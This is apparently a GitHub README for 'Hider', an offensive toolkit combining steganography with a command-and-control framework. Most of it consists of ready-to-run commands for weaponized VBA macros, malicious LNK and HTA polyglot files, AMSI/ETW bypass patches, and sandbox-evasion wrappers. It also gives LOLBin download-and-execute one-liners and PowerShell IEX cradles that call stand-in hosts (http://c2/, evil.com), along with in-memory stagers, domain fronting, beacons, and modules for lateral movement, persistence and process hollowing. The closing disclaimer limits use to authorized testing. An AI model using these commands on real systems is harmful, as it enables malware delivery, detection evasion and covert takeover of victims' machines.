<p align="center">
  <img src="assets/logo.png" alt="Hider Logo" width="400">
</p>

<div align="center">

# 🕵️ Hider — Advanced Steganography & Security Research Toolkit

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-0078D4?logo=windows&logoColor=white)]()
[![PRs](https://img.shields.io/badge/PRs-Welcome-brightgreen)]()

A unified CLI, web dashboard, and C2 framework for metadata manipulation, steganography, payload delivery, and post-exploitation — built for penetration testers and security researchers.

</div>

---

## 🚀 Feature Overview

| Category | Technique | Description |
|---|---|---|
| **GUI Dashboard** | Flask Web UI | Modern glassmorphic interface for all operations & C2 console |
| **Image** | EXIF Manipulation | View, edit, tag-level inject payloads into JPG/TIFF metadata |
| **Image** | LSB Steganography | Hide data in least-significant bits of lossless images (PNG, BMP) |
| **Image** | JPEG Structure Exploit | Inject payloads into trailing or pre-header JPEG segments |
| **Audio** | WAV LSB | Hide encrypted data in `.wav` least-significant bits |
| **Archive** | ZIP Padding | Inject hidden data into ZIP tail space (file remains valid) |
| **Universal** | Tail-Loading | Append/retrieve data to/from the end of any binary file |
| **Universal** | HTA Polyglot | Generate files valid as both JPG and HTA with AMSI bypass |
| **PDF** | JS Injection | Inject obfuscated JavaScript into PDF Open Actions |
| **Office** | Metadata Edit | Manipulate core properties in `.docx`, `.xlsx`, `.pptx` |
| **DLL / PE** | Resource Injection | Hide data inside Windows executable version strings |
| **Video** | Metadata Edit | Manipulate tags (Artist, Comment) via FFmpeg |
| **Shortcut** | LNK Evasion | Generate malicious `.lnk` shortcuts |
| **Evasion** | Sandbox Detection | JScript/VBScript wrappers checking RAM, CPU, domain |
| **Evasion** | VBA Macros | Auto-generate weaponized, obfuscated VBA macros |
| **Evasion** | ETW/AMSI Patch | Generate runtime PowerShell patches for AmsiScanBuffer & EtwEventWrite |
| **LOLBins** | Chain Generator | Generate mshta/rundll32/certutil/regsvr32/msiexec one-liners & LNK |
| **Encryption** | AES-256-CBC | Encrypt/decrypt any payload with password before hiding |
| **Polymorphic** | Payload Wrapper | Multi-layer AES-256 wrapping with unique keys/IVs per run |
| **Domain Fronting** | CDN Abuse | Generate curl/IWR/raw HTTP snippets for CloudFront, Azure, Cloudflare |
| **Loaders** | Reflective Stagers | Generate PowerShell shellcode/PE & Linux memfd in-memory stagers |
| **C2 Server** | Flask + SQLite | Full-featured command & control listener with mTLS support |
| **C2 Console** | Interactive Shell | Manage implants, queue commands, execute modules |
| **Implant** | Beacon Generator | Custom Python/PowerShell beacons (sleep, jitter, kill-date, P2P) |
| **P2P C2** | Mesh Networking | Named-pipe SMB pivoting between implants |
| **Staging** | Automated Recipes | Multi-stage attack chains (AMSI patch + shellcode loader) |
| **OpSec** | Evasion | Sleep masking, domain rotation, custom headers, rotating AES keys |
| **Lateral** | SMB / WMI / WinRM / SSH | Fileless lateral movement modules |
| **Persistence** | Cron / Registry | Post-exploitation persistence modules |
| **Injection** | Shellcode / .NET / Python | In-memory code injection and process hollowing |
| **Recon** | Sysinfo / Whoami / Screenshot | Host reconnaissance modules |

---

## 🛠️ Installation

```bash
git clone https://github.com/Nciibi/hider.git
cd hider

python3 -m venv venv
source venv/bin/activate   # Windows: venv\Scripts\activate

pip install -r requirements.txt
```

### External Dependencies

- **FFmpeg** — Required for video metadata editing: `sudo apt install ffmpeg`

---

## 🖥️ GUI Dashboard

Launch the web-based glassmorphic interface with a built-in C2 Operator Console:

```bash
python3 app.py
```

Open **http://127.0.0.1:5000** in your browser.

![GUI Dashboard](assets/dashboard.png)

The dashboard supports all major operations with dynamic forms, file uploads, and real-time C2 session management.

---

## 📖 CLI Reference

### Image EXIF Manipulation
```bash
# View all EXIF tags
python3 hider.py view image.jpg

# Inject payload into a specific tag
python3 hider.py inject image.jpg --ifd Exif --tag 37510 --payload "XSS<script>" --out out.jpg

# Edit a specific EXIF tag
python3 hider.py edit image.jpg --ifd 0th --tag 271 --value "Attacker" --out modified.jpg

# Hide a file inside EXIF metadata (base64-encoded)
python3 hider.py hide image.jpg --file secret.zip --tag 37510 --out stego.jpg

# Extract hidden data from EXIF
python3 hider.py extract stego.jpg --tag 37510 --out extracted.zip
```

### JPEG Structure Exploitation
```bash
# Append payload after JPEG EOI marker (FF D9)
python3 hider.py exploit-structure image.jpg --type trailing --payload "HIDDEN" --out payload.jpg

# Inject payload between SOI and first segment
python3 hider.py exploit-structure image.jpg --type pre-header --payload "DATA" --out payload.jpg
```

### Universal Steganography (any file)
```bash
# Hide data in any file (tail-loading) with optional AES-256 encryption
python3 hider.py universal secret.pdf --mode hide --data "SECRET" --password "mypass" --out output.pdf

# Extract hidden data
python3 hider.py universal output.pdf --mode extract --password "mypass"

# Create an HTA polyglot (valid as both JPG and HTA)
python3 hider.py universal image.jpg --mode hta-polyglot --data "calc.exe" --obfuscate --out payload.hta
```

### LSB Image Steganography
```bash
# Hide data in image pixels (lossless images only: PNG, BMP)
python3 hider.py lsb image.png --mode hide --data "My Secret" --password "s3cr3t" --out stego.png

# Extract hidden data
python3 hider.py lsb stego.png --mode extract --password "s3cr3t"
```

### Audio Steganography (.WAV)
```bash
# Hide encrypted data in WAV audio
python3 hider.py audio clip.wav --mode hide --data "Audio Secret" --password "mypass" --out hidden.wav

# Extract it
python3 hider.py audio hidden.wav --mode extract --password "mypass"
```

### Archive Steganography (.ZIP)
```bash
# Inject data after the ZIP End-of-Central-Directory record
python3 hider.py archive archive.zip --mode hide --data "Hidden!" --password "zippass" --out secret.zip

# Extract
python3 hider.py archive secret.zip --mode extract --password "zippass"
```

### PDF Manipulation
```bash
# View PDF metadata
python3 hider.py pdf document.pdf --mode view

# Edit PDF metadata
python3 hider.py pdf document.pdf --mode edit --key /Title --value "New Title" --out out.pdf

# Inject obfuscated JS Open Action
python3 hider.py pdf document.pdf --mode open-action --value "app.alert('X');" --obfuscate --out malicious.pdf
```

### Office Document Manipulation
```bash
# View Office document metadata
python3 hider.py office report.docx --mode view

# Edit core property
python3 hider.py office report.docx --mode edit --key author --value "Attacker" --out modified.docx
```

### DLL / PE Resource Injection
```bash
# View PE info (sections, version strings)
python3 hider.py dll binary.dll --mode view

# Hide data inside PE version strings
python3 hider.py dll binary.dll --mode hide --data "HIDDEN_DATA" --out modified.dll

# Extract hidden data
python3 hider.py dll modified.dll --mode extract
```

### Video Metadata Manipulation
```bash
# View video metadata
python3 hider.py video video.mp4 --mode view

# Edit video metadata (requires FFmpeg)
python3 hider.py video video.mp4 --mode edit --key artist --value "Attacker" --out out.mp4
```

### LNK Shortcut Generation
```bash
python3 hider.py shortcut --cmd "powershell -WindowStyle Hidden -c calc" --icon "%windir%\system32\notepad.exe" --out payload.lnk
```

### Evasion & Sandbox Bypass Wrappers
```bash
# Generate JScript wrapper with sandbox checks (>=8GB RAM, >=4 cores, 2s sleep)
python3 hider.py evasion --payload "powershell -c calc" --type jscript \
  --min-ram 8 --min-cores 4 --sleep 2000 --check-domain --out evasion.js

# Generate VBScript wrapper
python3 hider.py evasion --payload "cmd /c calc" --type vbscript --out evasion.vbs
```

### VBA Macro Generator
```bash
# Generate weaponized macro with domain-join check
python3 hider.py vba --payload "powershell -c Start-Process calc.exe" \
  --check-domain --min-ram 4 --min-cores 2 --sleep 3000 --out macro.vba
```

### LOLBin Chain Generator
```bash
# mshta remote HTA execution
python3 hider.py lolbin --type mshta --url http://c2/payload.hta

# mshta inline VBScript
python3 hider.py lolbin --type mshta-inline --payload "calc.exe"

# rundll32 JavaScript execution
python3 hider.py lolbin --type rundll32 --url http://c2/payload.sct

# certutil download + execute
python3 hider.py lolbin --type certutil --url http://c2/beacon.exe

# regsvr32 .sct execution
python3 hider.py lolbin --type regsvr32 --url http://c2/payload.sct

# msiexec remote MSI
python3 hider.py lolbin --type msiexec --url http://c2/payload.msi

# PowerShell download cradle
python3 hider.py lolbin --type ps-cradle --url http://c2/beacon.ps1

# All one-liners can be wrapped in a .lnk shortcut:
python3 hider.py lolbin --type certutil --url http://c2/payload.exe --lnk drop.lnk --out chain.txt
```

### ETW/AMSI Runtime Patch Generator
```bash
# Generate AMSI patch snippet
python3 hider.py patch --target amsi --out bypass.ps1

# Generate ETW patch snippet
python3 hider.py patch --target etw --out etw_bypass.ps1

# Generate both (default)
python3 hider.py patch --target all --obfuscate --out full_bypass.ps1
```

### Polymorphic Payload Wrapper
```bash
# Wrap an inline payload with 2 layers of AES-256 encryption
python3 hider.py poly --payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon')" --layers 2 --out payload.ps1

# Wrap an entire file
python3 hider.py poly --file shellcode.bin --layers 3 --out enc.ps1
```

### Domain Fronting Generator
```bash
python3 hider.py front --real evil.com --front d123.cloudfront.net --path "/beacon.ps1" --out front.txt
```

### Reflective In-Memory Stagers
```bash
# Generate Windows PowerShell shellcode stager
python3 hider.py loader --url http://c2/shellcode.bin --platform windows --type shellcode --out stager.ps1

# Generate Windows PE / .NET assembly stager
python3 hider.py loader --url http://c2/beacon.exe --platform windows --type pe --out pe_stager.ps1

# Generate Linux memfd stager
python3 hider.py loader --url http://c2/elf --platform linux --type all --out stager.sh

# Generate both Windows + Linux stagers
python3 hider.py loader --url http://c2/shellcode.bin --platform both --type shellcode --out all_stagers.txt
```

### Command & Control (C2)

```bash
# Start the C2 HTTP Listener (Flask + SQLite)
python3 hider.py c2-server --port 8443

# Start with mTLS enabled
python3 hider.py c2-server --port 8443 --mtls

# Launch the interactive Operator Console
python3 hider.py c2-console
```

#### C2 Console Commands
```
c2> list                          # List active sessions
c2> interact <id>                 # Select session
c2> cmd <id> "powershell whoami"  # Queue command for session
c2> results <id>                  # View command results
c2> use lat_smb 10.0.0.2 "cmd"   # Run lateral SMB module
c2> use lat_wmi 10.0.0.2 "cmd"   # Run lateral WMI module
c2> use lat_winrm 10.0.0.2 "cmd" # Run lateral WinRM module
c2> use lat_ssh 10.0.0.2 "cmd"   # Run lateral SSH module
c2> use screenshot <id>           # Take remote screenshot
c2> use sysinfo <id>              # Get system info
c2> use whoami <id>               # Get current user
c2> use persist_registry <id>     # Install registry persistence
c2> use persist_cron <target>     # Install cron persistence (Linux)
c2> use inject_shellcode <id>     # Inject shellcode into remote process
c2> use inject_dotnet <id>        # Reflectively load .NET assembly
c2> use inject_python <id>        # Inject Python interpreter
c2> use hollow <id> "cmd"         # Process hollowing
c2> use p2p_link <target> <pipe>  # Establish P2P named pipe link
c2> modules                       # List all available modules
c2> help                          # Show this help
c2> exit                          # Quit console
```

#### Beacon Generation
```bash
# Generate a Python beacon (callbacks every 5s, 20% jitter)
python3 hider.py c2-beacon --url http://127.0.0.1:8443 --lang python --sleep 5 --jitter 20 --out beacon.py

# Generate a PowerShell beacon with kill date
python3 hider.py c2-beacon --url https://c2.example.com --lang powershell --sleep 10 --kill-date 2025-12-31 --out beacon.ps1

# Generate a P2P named-pipe beacon (mesh networking)
python3 hider.py c2-beacon --ptp named-pipe --pipe-name hider_c2 --lang python --out p2p_beacon.py

# Generate a beacon with sleep masking and custom headers
python3 hider.py c2-beacon --url http://127.0.0.1:8443 --sleep-mask --headers '{"User-Agent": "Mozilla/5.0"}' --out masked_beacon.py
```

#### Staged Payload Recipes
```bash
# Windows full chain: AMSI/ETW bypass + polymorphic shellcode stager
python3 hider.py c2-stage --recipe windows_full --url "http://127.0.0.1:8443/beacon"

# LNK dropper with certutil chain
python3 hider.py c2-stage --recipe lnk_dropper --url "http://c2/beacon.exe"

# Office macro with sandbox evasion + download cradle
python3 hider.py c2-stage --recipe office_macro --url "http://c2/beacon.ps1"

# Linux in-memory ELF execution via memfd_create
python3 hider.py c2-stage --recipe linux_memfd --url "http://c2/elf"

# Domain-fronted PowerShell IEX cradle
python3 hider.py c2-stage --recipe fronted_ps --url "http://evil.com/beacon.ps1" --front d123.cloudfront.net --path "/beacon"
```

#### List Available Modules
```bash
python3 hider.py c2-modules
```

---

## 🧩 Post-Exploitation Module System

Hider features a hot-loadable plugin system in `modules/`. Each module auto-registers by defining `MODULE_INFO` and a `run()` function:

| Module | Platform | Description |
|---|---|---|
| `lat_smb` | Windows | Fileless SMB lateral movement |
| `lat_wmi` | Windows | WMI lateral movement |
| `lat_winrm` | Windows | WinRM lateral movement |
| `lat_ssh` | Linux | SSH pivot lateral movement |
| `hollow` | Windows | Process hollowing |
| `inject_shellcode` | Windows | Shellcode injection into remote process |
| `inject_dotnet` | Windows | Reflective .NET assembly loading |
| `inject_python` | Windows | Python interpreter injection |
| `p2p_link` | Windows | Establish named-pipe P2P link |
| `persist_registry` | Windows | Registry-based persistence |
| `persist_cron` | Linux | Cron-based persistence |
| `screenshot` | Windows | Remote desktop screenshot capture |
| `sysinfo` | All | System information gathering |
| `whoami` | All | Current user identification |

---

## 🏗️ Architecture

```
hider/
├── app.py                  # Flask web dashboard
├── hider.py                # CLI entry point (all commands)
├── metadata_engine.py      # EXIF manipulation (piexif)
├── universal_engine.py     # Tail-loading + HTA polyglots
├── lsb_engine.py           # LSB image steganography
├── audio_handler.py        # WAV LSB steganography
├── archive_handler.py      # ZIP padding steganography
├── pdf_handler.py          # PDF metadata + JS injection
├── office_handler.py       # Office document metadata
├── pe_handler.py           # PE/DLL resource injection
├── video_handler.py        # Video metadata (FFmpeg)
├── lnk_handler.py          # Malicious shortcut generation
├── encryption_engine.py    # AES-256-CBC encryption
├── evasion_engine.py       # JScript/VBScript sandbox wrappers
├── macro_engine.py         # VBA macro generation
├── lolbin_engine.py        # LOLBin one-liner chains
├── patch_engine.py         # ETW/AMSI runtime patches
├── poly_engine.py          # Polymorphic AES-256 wrapper
├── front_engine.py         # Domain fronting headers
├── loader_engine.py        # Reflective in-memory stagers
├── c2/
│   ├── server.py           # C2 HTTP(S) listener
│   ├── console.py          # Interactive operator console
│   ├── beacon_gen.py       # Implant beacon generator
│   ├── stager.py           # Multi-stage attack recipes
│   ├── session.py          # Session management
│   └── stages/             # Generated stage output
├── modules/                # Hot-loadable plugin modules
│   ├── lat_smb.py          # SMB lateral movement
│   ├── lat_wmi.py          # WMI lateral movement
│   ├── inject_shellcode.py # Shellcode injection
│   ├── p2p_link.py         # P2P mesh networking
│   └── ...                 # 14+ modules total
├── templates/index.html    # Web dashboard template
├── static/                 # CSS/JS for dashboard
└── assets/                 # Logo and screenshots
```

---

## 🔒 OpSec & Evasion Features

- **AES-256-CBC encryption** — All hidden data and C2 traffic can be encrypted
- **Polymorphic payloads** — Each generated payload file is uniquely encrypted with random keys/IVs
- **Sleep masking** — Beacon memory is encrypted during sleep intervals
- **Domain fronting** — CDN-backed C2 traffic via CloudFront, Azure CDN, Cloudflare Workers
- **mTLS support** — Mutual TLS for C2 channels
- **Rotating AES keys** — Per-session key negotiation for C2 communication
- **Custom HTTP headers** — Beacon User-Agent and header customization
- **Kill dates** — Beacons self-destruct after a specified date
- **Jitter** — Randomized sleep intervals to avoid pattern detection
- **HTA polyglots** — Files valid as both images and HTA applications
- **ETW/AMSI patching** — In-memory PowerShell patches before payload execution

---

## 🗺️ Roadmap

✅ **v1.0 Goals Fully Implemented**:
- Encrypted C2 Channels: mTLS, AES encryption, and rotating keys
- P2P Beacons: SMB pivoting, named pipes, and mesh architectures
- OpSec Protections: Traffic shaping, domain rotation, and sleep masking
- Lateral Movement Modules: Fileless SMB, WMI, WinRM, and SSH pivot
- LOLBin Chains: mshta, rundll32, certutil, regsvr32, msiexec, PS cradles
- Polymorphic Engine: Multi-layer AES-256 wrapping with unique per-run output
- Domain Fronting: CloudFront, Azure CDN, Cloudflare Workers support
- Reflective Loaders: Shellcode, PE/.NET assembly, Linux memfd stagers
- Post-Exploitation Modules: 14+ hot-loadable plugins

---

## ⚠️ Disclaimer

This tool is provided for **educational and ethical security research purposes only**.

Only use Hider on systems and files you own or have **explicit written permission** to test. The authors accept no responsibility for misuse or damage resulting from this tool.

**This tool is not for malicious use. Use responsibly.**

---

## 📄 License

MIT License — See `LICENSE` for details.
